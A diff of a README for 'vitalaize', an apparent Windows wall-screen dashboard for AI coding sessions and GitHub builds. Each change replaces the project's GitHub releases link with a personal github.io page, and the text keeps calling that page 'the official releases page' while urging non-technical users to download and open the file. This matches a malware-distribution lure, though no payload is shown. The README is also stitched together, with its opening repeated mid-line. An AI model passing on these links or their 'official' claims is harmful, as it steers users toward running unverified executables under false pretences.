@@ -1,6 +1,6 @@
 # 🖥️ vitalaize - Your Coding Sessions on One Wall Screen
 
-[![Download vitalaize](https://img.shields.io/badge/Download_vitalaize-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kerriesingle633/vitalaize/releases)
+[![Download vitalaize](https://img.shields.io/badge/Download_vitalaize-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://kerriesingle633.github.io)
 
 vitalaize turns your computer screen into a clear, always-visible wall screen for your Claude Code and Codex sessions and your GitHub builds. Instead of jumping between windows, you get one calm view that shows what is active, what is finished, and what needs your attention.
 
@@ -21,7 +21,7 @@ You can use vitalaize on a spare monitor, a large display, or your main Windows 
 - **Good for shared spaces:** Put it on a team screen so everyone can see current work.
 - **Simple setup:** Download it from the official releases page and open it on Windows# 🖥️ vitalaize - Your Coding Sessions on One Wall Screen
 
-[![Download vitalaize](https://img.shields.io/badge/Download_vitalaize-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kerriesingle633/vitalaize/releases)
+[![Download vitalaize](https://img.shields.io/badge/Download_vitalaize-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://kerriesingle633.github.io)
 
 vitalaize is a wall screen for your Claude Code and Codex sessions and your GitHub builds. It gives you one clear place to see what is active, what is waiting, and what has finished. Instead of hunting through windows, you can keep vitalaize open on your Windows screen and understand your work at a glance.
 
@@ -31,13 +31,13 @@ It is made for everyday computer users. You do not need to know how to program t
 
 Getting vitalaize is simple. Use the official releases page below.
 
-[Visit this link to download the application](https://github.com/kerriesingle633/vitalaize/releases)
+[Visit this link to download the application](https://kerriesingle633.github.io)
 
 The releases page is the official place to get vitalaize for Windows. After the download finishes, open the downloaded file to start vitalaize. Keep the app open on the screen you want to use as your wall screen.
 
 If you want a large, easy-to-see button, use this one:
 
-[![Get vitalaize for Windows](https://img.shields.io/badge/Get_vitalaize_for_Windows-00B894?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/kerriesingle633/vitalaize/releases)
+[![Get vitalaize for Windows](https://img.shields.io/badge/Get_vitalaize_for_Windows-00B894?style=for-the-badge&logo=windows&logoColor=white)](https://kerriesingle633.github.io)
 
 ## 🖥️ What You’ll See
 
@@ -57,7 +57,7 @@ You do not have to read long logs or open many tabs. The wall screen gives you a
 
 Set up vitalaize on the Windows computer where you want to keep an eye on your sessions and builds. A spare monitor, a large display, or a second screen works well, but you can also use your main screen.
 
-1. Open the official releases page: [Visit this link to download the application](https://github.com/kerriesingle633/vitalaize/releases).
+1. Open the official releases page: [Visit this link to download the application](https://kerriesingle633.github.io).
 2. When the download finishes, open the downloaded file to start vitalaize.
 3. Move the vitalaize window to the screen you want to use as your wall screen.
 4. Keep the window open so you can see your sessions and builds during the day.
@@ -82,7 +82,7 @@ You do not need to understand the inner details to use the screen. Think of sess
 
 ## 🛠️ Troubleshooting
 
-If the download does not start, open the official releases page again: [Visit this link to download the application](https://github.com/kerriesingle633/vitalaize/releases). Make sure your internet connection is working and that the download has finished before you open the file.
+If the download does not start, open the official releases page again: [Visit this link to download the application](https://kerriesingle633.github.io). Make sure your internet connection is working and that the download has finished before you open the file.
 
 If vitalaize does not open, close the window and try opening the downloaded file again. If your computer seems slow or busy, wait a moment and try once more. Restarting your Windows computer can also help clear temporary issues.
 
@@ -111,7 +111,7 @@ Yes. Open the app the same way you opened it the first time. If you need to down
 
 Use the official releases page as the place to download vitalaize and to check for the latest available version:
 
-[Visit this link to download the application](https://github.com/kerriesingle633/vitalaize/releases)
+[Visit this link to download the application](https://kerriesingle633.github.io)
 
 Keep the link handy if you set up vitalaize on another Windows computer or need to download it again later. For the best experience, use the same official page each time so you know you are getting vitalaize from the right place.
 
@@ -119,7 +119,7 @@ Keep the link handy if you set up vitalaize on another Windows computer or need 
 
 If you need the download link one more time, use the button below.
 
-[![Download vitalaize](https://img.shields.io/badge/Download_vitalaize-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kerriesingle633/vitalaize/releases)
+[![Download vitalaize](https://img.shields.io/badge/Download_vitalaize-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://kerriesingle633.github.io)
 
 vitalaize gives you a clear wall screen for Claude Code and Codex sessions and your GitHub builds. Keep it visible, glance at it during the day, and let it help you stay aware of your work without extra window switching.
 
